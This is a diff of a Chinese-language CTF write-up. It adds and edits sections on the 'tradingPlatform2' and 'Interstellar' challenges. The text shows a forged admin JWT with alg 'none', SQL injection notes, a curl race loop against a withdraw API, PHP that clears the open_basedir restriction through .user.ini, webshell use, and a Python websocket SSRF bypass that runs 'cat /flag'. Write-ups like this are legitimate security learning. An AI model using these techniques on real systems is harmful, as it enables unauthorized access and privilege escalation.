@@ -2,7 +2,6 @@
 title: "ADCTF25-WP"
 pubDate: "2025-12-02"
 description: ""
-draft: true
 ---
 
 # Crypto
@@ -1289,22 +1288,22 @@ Table: secret
 +----+---------+--------------------------------------------+
 ```
 
-# tradingPlatform2
+## tradingPlatform2
 
 <https://gemini.google.com/share/62b530c80a44>
 
-## 提权分析
+### 提权分析
 
 Hint: 应用喜欢把数据存储在本地
 分析 localStorage；一开始是没有东西的，需要 login 一下（错误的也无妨），会生成一个 token 供参考，将格式化后的 js 文件一并给 AI 发现这里的权限验证是在前端完成的，参考 token 信息发现可以进行 JWT 伪造
 
-### JWT 伪造（写到 localStorage 的 token 中）
+#### JWT 伪造（写到 localStorage 的 token 中）
 
 ```txt
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE3NjM4Njg4MzEsInN1YiI6eyJuYW1lIjoiYWRtaW4iLCJpc19sb2dpbiI6dHJ1ZX19.
 ```
 
-## HACK
+### HACK
 
 进入之后抓包，找到以下 API 端点（只有这一个端点），由于有查询数据库的成分，尝试进行 SQL 注入
 
@@ -1513,4 +1512,77 @@ seq $NEEDED | xargs -P 10 -I {} curl -s -X POST http://$REMOTE/api/withdraw \
 
 curl -s http://$REMOTE/api/gift \
   -H "Authorization: Bearer $TOKEN" | jq -r '.flag'
+```
+
+## Interstellar
+
+### 注入、分析环境
+
+```php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
+```
+
+scandir
+
+```php
+print_r(scandir(__DIR__));
+```
+
+```php
+<?php
+$ini_file = __DIR__ . '/.user.ini';
+
+// 期望写入的内容：清空 open_basedir 限制
+$new_content = "open_basedir =\n";
+
+// 尝试写入文件
+if (file_put_contents($ini_file, $new_content) !== false) {
+    echo "成功修改 .user.ini 文件，已尝试解除 open_basedir 限制。\n";
+    echo "注意：更改可能需要重启 PHP/Web 服务才能生效。\n";
+    echo "！！！强烈建议您评估安全风险！！！\n";
+} else {
+    echo "修改失败。可能是文件不存在、权限不足，或者脚本被 open_basedir 自身限制而无法访问此文件。\n";
+}
+```
+
+### 读取管理面板 app 源码
+
+蚁剑获取 Webshell 可以在文件面板中找到 app 目录，进去发现关键文件没有权限，拷贝所有源码到本地，分析
+
+核心漏洞在 proxy 功能，当然正解是通过 proxy 获取 Authorization key, 但是经过 AI 分析，可以耍小聪明，绕过命令执行验证
+
+```py
+import asyncio
+import websockets
+import jwt
+from datetime import datetime, timezone
+from urllib.parse import quote
+
+async def get_flag():
+    # 目标和WebSocket URL
+    target = ""
+    ws_url = f"ws://{target}/api/proxy/webcmd"
+
+    # 设置认证头
+    headers = {"Cookie": f"access_token=lalalalala~"}
+
+    # SSRF绕过：八进制端口 (":8837" -> ":08837")
+    payload = "ws://127.0.0.1:08837/webcmd"
+    final_url = f"{ws_url}?target={quote(payload)}"
+
+    try:
+        # 连接并执行命令
+        async with websockets.connect(final_url, additional_headers=headers) as ws:
+            await ws.send("cat /flag")
+            flag = await asyncio.wait_for(ws.recv(), timeout=5)
+            return flag.strip()
+
+    except Exception as e:
+        return f"Error: {e}"
+
+if __name__ == "__main__":
+    flag = asyncio.run(get_flag())
+    print(f"FLAG: {flag}")
 ```
